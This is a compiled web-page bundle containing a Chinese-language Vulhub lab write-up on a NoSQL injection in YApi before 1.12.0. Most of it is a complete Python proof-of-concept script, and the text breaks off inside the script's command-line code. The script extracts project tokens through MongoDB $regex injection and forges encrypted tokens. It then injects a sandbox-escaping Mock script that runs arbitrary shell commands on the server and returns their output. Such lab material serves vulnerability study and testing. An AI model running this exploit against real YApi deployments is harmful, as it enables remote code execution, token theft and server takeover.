import{_ as o}from"./plugin-vue_export-helper-c27b6911.js";import{r as e,o as c,c as i,a as n,b as s,d as t,e as p}from"./app-58e4a7d6.js";const l={},u=n("p",null,"YApi是一个API管理工具。在其1.12.0版本之前，存在一处NoSQL注入漏洞，通过该漏洞攻击者可以窃取项目Token，并利用这个Token执行任意Mock脚本，获取服务器权限。",-1),k=n("p",null,"参考链接：",-1),r={href:"https://github.com/YMFE/yapi/commit/59bade3a8a43e7db077d38a4b0c7c584f30ddf8c",target:"_blank",rel:"noopener noreferrer"},d=p(`<h2 id="漏洞环境" tabindex="-1"><a class="header-anchor" href="#漏洞环境" aria-hidden="true">#</a> 漏洞环境</h2><p>Vulhub执行如下命令启动一个YApi v1.10.2服务：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>环境启动后，访问<code>http://your-ip:3000</code>即可看到YApi首页。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202211251641047.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>本漏洞的利用需要YApi应用中至少存在一个项目与相关数据，否则无法利用。Vulhub环境中的YApi是一个即开即用、包含测试数据的服务器，所以可以直接进行漏洞复现。</p>`,7),v={href:"https://github.com/vulhub/vulhub/blob/master/yapi/mongodb-inj/poc.py",target:"_blank",rel:"noopener noreferrer"},m=p(`<div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>python poc.py --debug one4all -u http://your-ip:3000/
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202211251644280.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞poc" tabindex="-1"><a class="header-anchor" href="#漏洞poc" aria-hidden="true">#</a> 漏洞POC</h2>`,3),b={href:"https://github.com/vulhub/vulhub/blob/master/yapi/mongodb-inj/poc.py",target:"_blank",rel:"noopener noreferrer"},g=p(`<div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">import</span> requests
<span class="token keyword">import</span> json
<span class="token keyword">import</span> click
<span class="token keyword">import</span> re
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> logging
<span class="token keyword">import</span> hashlib
<span class="token keyword">import</span> binascii
<span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>primitives<span class="token punctuation">.</span>ciphers <span class="token keyword">import</span> Cipher<span class="token punctuation">,</span> algorithms<span class="token punctuation">,</span> modes
<span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>primitives <span class="token keyword">import</span> padding
<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> urljoin

logger <span class="token operator">=</span> logging<span class="token punctuation">.</span>getLogger<span class="token punctuation">(</span><span class="token string">&#39;attacker&#39;</span><span class="token punctuation">)</span>
logger<span class="token punctuation">.</span>setLevel<span class="token punctuation">(</span><span class="token string">&#39;WARNING&#39;</span><span class="token punctuation">)</span>
ch <span class="token operator">=</span> logging<span class="token punctuation">.</span>StreamHandler<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">)</span>
ch<span class="token punctuation">.</span>setFormatter<span class="token punctuation">(</span>logging<span class="token punctuation">.</span>Formatter<span class="token punctuation">(</span><span class="token string">&#39;%(asctime)s - %(message)s&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
logger<span class="token punctuation">.</span>addHandler<span class="token punctuation">(</span>ch<span class="token punctuation">)</span>
choices <span class="token operator">=</span> <span class="token string">&#39;abcedf0123456789&#39;</span>
script_template <span class="token operator">=</span> <span class="token triple-quoted-string string">r&#39;&#39;&#39;const sandbox = this
const ObjectConstructor = this.constructor
const FunctionConstructor = ObjectConstructor.constructor
const myfun = FunctionConstructor(&#39;return process&#39;)
const process = myfun()
const Buffer = FunctionConstructor(&#39;return Buffer&#39;)()
const output = process.mainModule.require(&quot;child_process&quot;).execSync(Buffer.from(&#39;%s&#39;, &#39;hex&#39;).toString()).toString()
context.responseData = &#39;testtest&#39; + output + &#39;testtest&#39;
&#39;&#39;&#39;</span>


<span class="token keyword">def</span> <span class="token function">compute</span><span class="token punctuation">(</span>passphase<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    nkey <span class="token operator">=</span> <span class="token number">24</span>
    niv <span class="token operator">=</span> <span class="token number">16</span>
    key <span class="token operator">=</span> <span class="token string">&#39;&#39;</span>
    iv <span class="token operator">=</span> <span class="token string">&#39;&#39;</span>
    p <span class="token operator">=</span> <span class="token string">&#39;&#39;</span>

    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>
        h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>binascii<span class="token punctuation">.</span>unhexlify<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span>
        h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>passphase<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        p <span class="token operator">=</span> h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>

        i <span class="token operator">=</span> <span class="token number">0</span>
        n <span class="token operator">=</span> <span class="token builtin">min</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token operator">-</span> i<span class="token punctuation">,</span> <span class="token number">2</span> <span class="token operator">*</span> nkey<span class="token punctuation">)</span>
        nkey <span class="token operator">-=</span> n <span class="token operator">//</span> <span class="token number">2</span>
        key <span class="token operator">+=</span> p<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i <span class="token operator">+</span> n<span class="token punctuation">]</span>
        i <span class="token operator">+=</span> n
        n <span class="token operator">=</span> <span class="token builtin">min</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token operator">-</span> i<span class="token punctuation">,</span> <span class="token number">2</span> <span class="token operator">*</span> niv<span class="token punctuation">)</span>
        niv <span class="token operator">-=</span> n <span class="token operator">//</span> <span class="token number">2</span>
        iv <span class="token operator">+=</span> p<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i <span class="token operator">+</span> n<span class="token punctuation">]</span>
        i <span class="token operator">+=</span> n

        <span class="token keyword">if</span> nkey <span class="token operator">+</span> niv <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> binascii<span class="token punctuation">.</span>unhexlify<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span> binascii<span class="token punctuation">.</span>unhexlify<span class="token punctuation">(</span>iv<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">aes_encode</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    key<span class="token punctuation">,</span> iv <span class="token operator">=</span> compute<span class="token punctuation">(</span><span class="token string">&#39;abcde&#39;</span><span class="token punctuation">)</span>
    padder <span class="token operator">=</span> padding<span class="token punctuation">.</span>PKCS7<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">.</span>padder<span class="token punctuation">(</span><span class="token punctuation">)</span>
    cipher <span class="token operator">=</span> Cipher<span class="token punctuation">(</span>algorithms<span class="token punctuation">.</span>AES<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span> modes<span class="token punctuation">.</span>CBC<span class="token punctuation">(</span>iv<span class="token punctuation">)</span><span class="token punctuation">)</span>
    encryptor <span class="token operator">=</span> cipher<span class="token punctuation">.</span>encryptor<span class="token punctuation">(</span><span class="token punctuation">)</span>
    ct <span class="token operator">=</span> encryptor<span class="token punctuation">.</span>update<span class="token punctuation">(</span>padder<span class="token punctuation">.</span>update<span class="token punctuation">(</span>data<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> padder<span class="token punctuation">.</span>finalize<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> encryptor<span class="token punctuation">.</span>finalize<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> binascii<span class="token punctuation">.</span>hexlify<span class="token punctuation">(</span>ct<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">aes_decode</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    key<span class="token punctuation">,</span> iv <span class="token operator">=</span> compute<span class="token punctuation">(</span><span class="token string">&#39;abcde&#39;</span><span class="token punctuation">)</span>
    unpadder <span class="token operator">=</span> padding<span class="token punctuation">.</span>PKCS7<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">.</span>unpadder<span class="token punctuation">(</span><span class="token punctuation">)</span>
    cipher <span class="token operator">=</span> Cipher<span class="token punctuation">(</span>algorithms<span class="token punctuation">.</span>AES<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span> modes<span class="token punctuation">.</span>CBC<span class="token punctuation">(</span>iv<span class="token punctuation">)</span><span class="token punctuation">)</span>
    decryptor <span class="token operator">=</span> cipher<span class="token punctuation">.</span>decryptor<span class="token punctuation">(</span><span class="token punctuation">)</span>
    ct <span class="token operator">=</span> decryptor<span class="token punctuation">.</span>update<span class="token punctuation">(</span>binascii<span class="token punctuation">.</span>unhexlify<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> decryptor<span class="token punctuation">.</span>finalize<span class="token punctuation">(</span><span class="token punctuation">)</span>
    ct <span class="token operator">=</span> unpadder<span class="token punctuation">.</span>update<span class="token punctuation">(</span>ct<span class="token punctuation">)</span> <span class="token operator">+</span> unpadder<span class="token punctuation">.</span>finalize<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> ct<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">brute_token</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> already<span class="token punctuation">)</span><span class="token punctuation">:</span>
    url <span class="token operator">=</span> urljoin<span class="token punctuation">(</span>target<span class="token punctuation">,</span> <span class="token string">&#39;/api/interface/up&#39;</span><span class="token punctuation">)</span>
    current <span class="token operator">=</span> <span class="token string">&#39;^&#39;</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> ch <span class="token keyword">in</span> choices<span class="token punctuation">:</span>
            guess <span class="token operator">=</span> current <span class="token operator">+</span> ch
            data <span class="token operator">=</span> <span class="token punctuation">{</span>
                <span class="token string">&#39;id&#39;</span><span class="token punctuation">:</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span>
                <span class="token string">&#39;token&#39;</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>
                    <span class="token string">&#39;$regex&#39;</span><span class="token punctuation">:</span> guess<span class="token punctuation">,</span>
                    <span class="token string">&#39;$nin&#39;</span><span class="token punctuation">:</span> already
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
            headers <span class="token operator">=</span> <span class="token punctuation">{</span>
                <span class="token string">&#39;Content-Type&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;application/json&#39;</span>
            <span class="token punctuation">}</span>
            response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>
                                     data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span>
                                     headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>
                                     <span class="token comment"># proxies={&#39;https&#39;: &#39;http://127.0.0.1:8085&#39;, &#39;http&#39;: &#39;http://127.0.0.1:8085&#39;},</span>
                                     <span class="token comment"># verify=False,</span>
                                     <span class="token punctuation">)</span>
            res <span class="token operator">=</span> response<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>

            <span class="token keyword">if</span> res<span class="token punctuation">[</span><span class="token string">&#39;errcode&#39;</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">400</span><span class="token punctuation">:</span>
                current <span class="token operator">=</span> guess
                <span class="token keyword">break</span>

        logger<span class="token punctuation">.</span>debug<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;current cuess: </span><span class="token interpolation"><span class="token punctuation">{</span>current<span class="token punctuation">}</span></span><span class="token string">&#39;</span></span><span class="token punctuation">)</span>

    <span class="token keyword">return</span> current<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>


<span class="token keyword">def</span> <span class="token function">find_owner_uid</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> token<span class="token punctuation">)</span><span class="token punctuation">:</span>
    url <span class="token operator">=</span> urljoin<span class="token punctuation">(</span>target<span class="token punctuation">,</span> <span class="token string">&#39;/api/project/get&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        params <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&#39;token&#39;</span><span class="token punctuation">:</span> aes_encode<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">}</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">{</span>token<span class="token punctuation">}</span></span><span class="token string">&#39;</span></span><span class="token punctuation">)</span><span class="token punctuation">}</span>
        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span>params<span class="token punctuation">,</span>
                            <span class="token comment"># proxies={&#39;https&#39;: &#39;http://127.0.0.1:8085&#39;, &#39;http&#39;: &#39;http://127.0.0.1:8085&#39;},</span>
                            <span class="token comment"># verify=False,</span>
                            <span class="token punctuation">)</span>
        data <span class="token operator">=</span> response<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> data<span class="token punctuation">[</span><span class="token string">&#39;errcode&#39;</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> i

    <span class="token keyword">return</span> <span class="token boolean">None</span>


<span class="token keyword">def</span> <span class="token function">find_project</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> token<span class="token punctuation">,</span> pid<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    url <span class="token operator">=</span> urljoin<span class="token punctuation">(</span>target<span class="token punctuation">,</span> <span class="token string">&#39;/api/project/get&#39;</span><span class="token punctuation">)</span>
    params <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&#39;token&#39;</span><span class="token punctuation">:</span> token<span class="token punctuation">}</span>
    <span class="token keyword">if</span> pid<span class="token punctuation">:</span>
        params<span class="token punctuation">[</span><span class="token string">&#39;id&#39;</span><span class="token punctuation">]</span> <span class="token operator">=</span> pid

    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>
                            params<span class="token operator">=</span>params<span class="token punctuation">,</span>
                            <span class="token comment">#proxies={&#39;https&#39;: &#39;http://127.0.0.1:8085&#39;, &#39;http&#39;: &#39;http://127.0.0.1:8085&#39;},</span>
                            <span class="token comment">#verify=False,</span>
                            <span class="token punctuation">)</span>
    data <span class="token operator">=</span> response<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> data<span class="token punctuation">[</span><span class="token string">&#39;errcode&#39;</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> data<span class="token punctuation">[</span><span class="token string">&#39;data&#39;</span><span class="token punctuation">]</span>


<span class="token keyword">def</span> <span class="token function">find_col</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> token<span class="token punctuation">,</span> brute_from<span class="token punctuation">,</span> brute_to<span class="token punctuation">)</span><span class="token punctuation">:</span>
    url <span class="token operator">=</span> urljoin<span class="token punctuation">(</span>target<span class="token punctuation">,</span> <span class="token string">&#39;/api/open/run_auto_test&#39;</span><span class="token punctuation">)</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>brute_from<span class="token punctuation">,</span> brute_to<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            params <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&#39;token&#39;</span><span class="token punctuation">:</span> token<span class="token punctuation">,</span> <span class="token string">&#39;id&#39;</span><span class="token punctuation">:</span> i<span class="token punctuation">,</span> <span class="token string">&quot;mode&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;json&quot;</span><span class="token punctuation">}</span>
            response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>
                                    params<span class="token operator">=</span>params<span class="token punctuation">,</span>
                                    timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span>
                                    <span class="token comment">#proxies={&#39;https&#39;: &#39;http://127.0.0.1:8085&#39;, &#39;http&#39;: &#39;http://127.0.0.1:8085&#39;},</span>
                                    <span class="token comment">#verify=False,</span>
                                    <span class="token punctuation">)</span>

            data <span class="token operator">=</span> response<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token string">&#39;message&#39;</span> <span class="token keyword">not</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>
                <span class="token keyword">continue</span>

            <span class="token keyword">if</span> data<span class="token punctuation">[</span><span class="token string">&#39;message&#39;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&#39;len&#39;</span><span class="token punctuation">]</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">:</span>
                logger<span class="token punctuation">.</span>debug<span class="token punctuation">(</span><span class="token string">&#39;Test Result Found: %r&#39;</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>url<span class="token punctuation">)</span>
                <span class="token keyword">yield</span> i
        <span class="token keyword">except</span> requests<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>Timeout<span class="token punctuation">:</span>
            logger<span class="token punctuation">.</span>debug<span class="token punctuation">(</span><span class="token string">&#39;id=%d timeout&#39;</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span>
            <span class="token keyword">pass</span>


<span class="token keyword">def</span> <span class="token function">update_project</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> token<span class="token punctuation">,</span> project_id<span class="token punctuation">,</span> command<span class="token punctuation">)</span><span class="token punctuation">:</span>
    url <span class="token operator">=</span> urljoin<span class="token punctuation">(</span>target<span class="token punctuation">,</span> <span class="token string">&#39;/api/project/up&#39;</span><span class="token punctuation">)</span>

    command_hex <span class="token operator">=</span> command<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    script <span class="token operator">=</span> script_template <span class="token operator">%</span> command_hex
    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>
                             params<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">&#39;token&#39;</span><span class="token punctuation">:</span> token<span class="token punctuation">}</span><span class="token punctuation">,</span>
                             json<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">&#39;id&#39;</span><span class="token punctuation">:</span> project_id<span class="token punctuation">,</span> <span class="token string">&#39;after_script&#39;</span><span class="token punctuation">:</span> script<span class="token punctuation">}</span><span class="token punctuation">,</span>
                             <span class="token comment"># proxies={&#39;https&#39;: &#39;http://127.0.0.1:8085&#39;, &#39;http&#39;: &#39;http://127.0.0.1:8085&#39;},</span>
                             <span class="token comment"># verify=False,</span>
                             <span class="token punctuation">)</span>
    data <span class="token operator">=</span> response<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> data<span class="token punctuation">[</span><span class="token string">&#39;errcode&#39;</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span>


<span class="token keyword">def</span> <span class="token function">run_auto_test</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> token<span class="token punctuation">,</span> col_id<span class="token punctuation">)</span><span class="token punctuation">:</span>
    url <span class="token operator">=</span> urljoin<span class="token punctuation">(</span>target<span class="token punctuation">,</span> <span class="token string">&#39;/api/open/run_auto_test&#39;</span><span class="token punctuation">)</span>

    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> 
                            params<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">&#39;token&#39;</span><span class="token punctuation">:</span> token<span class="token punctuation">,</span> <span class="token string">&#39;id&#39;</span><span class="token punctuation">:</span> col_id<span class="token punctuation">,</span> <span class="token string">&#39;mode&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;json&#39;</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
                            <span class="token comment"># proxies={&#39;https&#39;: &#39;http://127.0.0.1:8085&#39;, &#39;http&#39;: &#39;http://127.0.0.1:8085&#39;},</span>
                            <span class="token comment"># verify=False,</span>
                            <span class="token punctuation">)</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        data <span class="token operator">=</span> response<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> data<span class="token punctuation">[</span><span class="token string">&#39;list&#39;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&#39;res_body&#39;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">]</span>
    <span class="token keyword">except</span> <span class="token punctuation">(</span>requests<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>JSONDecodeError<span class="token punctuation">,</span> KeyError<span class="token punctuation">,</span> IndexError<span class="token punctuation">,</span> TypeError<span class="token punctuation">)</span> <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        g <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">br&#39;testtest(.*?)testtest&#39;</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>content<span class="token punctuation">,</span> re<span class="token punctuation">.</span>I <span class="token operator">|</span> re<span class="token punctuation">.</span>S<span class="token punctuation">)</span>
        <span class="token keyword">if</span> g<span class="token punctuation">:</span>
            <span class="token keyword">return</span> g<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token boolean">None</span>


<span class="token keyword">def</span> <span class="token function">clear_project</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> token<span class="token punctuation">,</span> project_id<span class="token punctuation">,</span> old_after_script<span class="token punctuation">)</span><span class="token punctuation">:</span>
    url <span class="token operator">=</span> urljoin<span class="token punctuation">(</span>target<span class="token punctuation">,</span> <span class="token string">&#39;/api/project/up&#39;</span><span class="token punctuation">)</span>
    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">&#39;token&#39;</span><span class="token punctuation">:</span> token<span class="token punctuation">}</span><span class="token punctuation">,</span> json<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">&#39;id&#39;</span><span class="token punctuation">:</span> project_id<span class="token punctuation">,</span> <span class="token string">&#39;after_script&#39;</span><span class="token punctuation">:</span> old_after_script<span class="token punctuation">}</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> response<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> data<span class="token punctuation">[</span><span class="token string">&#39;errcode&#39;</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span>


<span class="token decorator annotation punctuation">@click<span class="token punctuation">.</span>group</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@click<span class="token punctuation">.</span>option</span><span class="token punctuation">(</span><span class="token string">&#39;--debug&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;debug&#39;</span><span class="token punctuation">,</span> is_flag<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">bool</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">cli</span><span class="token punctuation">(</span>debug<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>
        logger<span class="token punctuation">.</span>setLevel<span class="token punctuation">(</span><span class="token string">&#39;DEBUG&#39;</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@cli<span class="token punctuation">.</span>command</span><span class="token punctuation">(</span><span class="token string">&#39;enc&#39;</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@click<span class="token punctuation">.</span>argument</span><span class="token punctuation">(</span><span class="token string">&#39;data&#39;</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">cmd_enc</span><span class="token punctuation">(</span>data<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    click<span class="token punctuation">.</span>echo<span class="token punctuation">(</span>aes_encode<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@cli<span class="token punctuation">.</span>command</span><span class="token punctuation">(</span><span class="token string">&#39;dec&#39;</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@click<span class="token punctuation">.</span>argument</span><span class="token punctuation">(</span><span class="token string">&#39;data&#39;</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">cmd_dec</span><span class="token punctuation">(</span>data<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    click<span class="token punctuation">.</span>echo<span class="token punctuation">(</span>aes_decode<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@cli<span class="token punctuation">.</span>command</span><span class="token punctuation">(</span><span class="token string">&#39;token&#39;</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@click<span class="token punctuation">.</span>option</span><span class="token punctuation">(</span><span class="token string">&#39;-u&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;--url&#39;</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@click<span class="token punctuation">.</span>option</span><span class="token punctuation">(</span><span class="token string">&#39;-c&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;--count&#39;</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">cmd_token</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> count<span class="token punctuation">)</span><span class="token punctuation">:</span>
    already <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>count<span class="token punctuation">)</span><span class="token punctuation">:</span>
        token <span class="token operator">=</span> brute_token<span class="token punctuation">(</span>url<span class="token punctuation">,</span> already<span class="token punctuation">)</span>
